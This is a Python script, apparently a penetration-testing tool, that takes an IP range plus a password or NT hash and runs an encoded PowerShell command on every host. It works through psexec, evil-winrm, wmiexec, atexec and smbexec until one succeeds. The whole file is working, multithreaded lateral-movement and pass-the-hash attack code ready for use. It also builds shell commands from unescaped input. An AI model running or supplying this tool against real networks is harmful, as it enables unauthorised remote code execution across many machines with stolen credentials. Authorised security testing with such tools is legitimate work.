#!/usr/bin/env python3
import subprocess
import base64
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

EXEC_TIMEOUT = 15
MAX_THREADS = 10

VERBOSE = False

# Thread-safe lock for printing
print_lock = threading.Lock()

def vprint(msg):
    if VERBOSE:
        with print_lock:
            print(msg)

def safe_print(msg):
    with print_lock:
        print(msg)

def parse_ip_range(ip_range):
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [f"{a}.{b}.{c}.{d}"
            for a in expanded[0]
            for b in expanded[1]
            for c in expanded[2]
            for d in expanded[3]]


def is_nthash(credential):
    """Check if credential is an NT hash (32 hex chars, optionally prefixed with ':')"""
    # Strip leading colon if present
    cred = credential.lstrip(':')
    # Check if it's exactly 32 hex characters
    if len(cred) == 32:
        try:
            int(cred, 16)  # Verify it's valid hex
            return True
        except ValueError:
            return False
    return False


def build_cmd(tool, user, target, credential, command):
    b64 = base64.b64encode(command.encode("utf-16le")).decode()
    use_hash = is_nthash(credential)

    # Strip leading colon from credential if present for hash auth
    cred_clean = credential.lstrip(':') if use_hash else credential

    if tool == "psexec":
        if use_hash:
            return f"impacket-psexec -hashes :{cred_clean} '{user}'@{target} 'powershell -enc {b64}'"
        else:
            return f"impacket-psexec '{user}':'{credential}'@{target} 'powershell -enc {b64}'"

    if tool == "wmiexec":
        if use_hash:
            return f"impacket-wmiexec -hashes :{cred_clean} '{user}'@{target} 'powershell -enc {b64}'"
        else:
            return f"impacket-wmiexec '{user}':'{credential}'@{target} 'powershell -enc {b64}'"

    if tool == "atexec":
        if use_hash:
            return f"impacket-atexec -hashes :{cred_clean} '{user}'@{target} 'powershell -enc {b64}'"
        else:
            return f"impacket-atexec '{user}':'{credential}'@{target} 'powershell -enc {b64}'"

    if tool == "smbexec":
        if use_hash:
            return f"nxc smb {target} -H :{cred_clean} -u '{user}' -X 'powershell -enc {b64}' --exec-method smbexec"
        else:
            return f"nxc smb {target} -p '{credential}' -u '{user}' -X 'powershell -enc {b64}' --exec-method smbexec"

    if tool == "winrm":
        if use_hash:
            return f"echo 'powershell -enc {b64}' | evil-winrm -i {target} -u '{user}' -H {cred_clean}"
        else:
            return f"echo 'powershell -enc {b64}' | evil-winrm -i {target} -u '{user}' -p {credential}"

    raise Exception(f"Unknown tool: {tool}")


def run_chain(user, ip, credential, command):
    chain = ["psexec", "winrm", "wmiexec", "atexec", "smbexec"]

    for tool in chain:
        cmd = build_cmd(tool, user, ip, credential, command)
        safe_print(f"[i] Trying {tool}: {cmd}")

        try:
            result = subprocess.run(cmd, shell=True, timeout=EXEC_TIMEOUT, capture_output=True)
            rc = result.returncode
            out = result.stdout.decode("utf-8", errors="ignore")
            vprint(f"[v] Output for {tool} on {ip} (rc={rc}):\n{out}")
        except subprocess.TimeoutExpired:
            safe_print(f"[-] For {ip}: {tool} timed out.")
            continue

        if tool == "atexec" and '[-]' in out:
            safe_print(f"[-] For {ip}: {tool} failed.")
            continue

        if tool == "smbexec" and '[-]' in out:
            safe_print(f"[-] For {ip}: {tool} failed.")
            continue

        if rc == 0 or (tool == "winrm" and rc == 1):
            safe_print(f"[+] For {ip}: {tool} succeeded.")
            return tool

        safe_print(f"[-] For {ip}: {tool} failed.")

    return None


def execute_on_ip(username, ip, credential, command):
    """Worker function to execute command on a single IP"""
    safe_print(f"[*] Attempting to execute command on {ip}...")
    tool = run_chain(username, ip, credential, command)

    if tool is None:
        safe_print(f"[!] All tools failed for {ip}.")
        return (ip, None)
    else:
        safe_print(f"[+] Command executed on {ip} using {tool}.")
        return (ip, tool)


def main():
    global VERBOSE

    if len(sys.argv) < 4:
        print("Usage: exec_across_ips.py <ip_range> <username> <credential> <command> [-v]")
        print("  credential: either a password or NT hash")
        sys.exit(1)

    # detect -v anywhere
    if "-v" in sys.argv:
        VERBOSE = True
        sys.argv.remove("-v")

    ip_range = sys.argv[1]
    username = sys.argv[2]
    credential = sys.argv[3]
    command = " ".join(sys.argv[4:]) if len(sys.argv) > 4 else "whoami"

    ips = parse_ip_range(ip_range)

    # Detect auth type
    auth_type = "hash" if is_nthash(credential) else "password"
    print(f"[*] Detected credential type: {auth_type}")
    print(f"[*] Processing {len(ips)} IPs with {MAX_THREADS} threads...")

    # Use ThreadPoolExecutor to process IPs in parallel
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # Submit all tasks
        futures = [executor.submit(execute_on_ip, username, ip, credential, command) for ip in ips]

        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                safe_print(f"[!] Exception occurred: {e}")


if __name__ == "__main__":
    main()
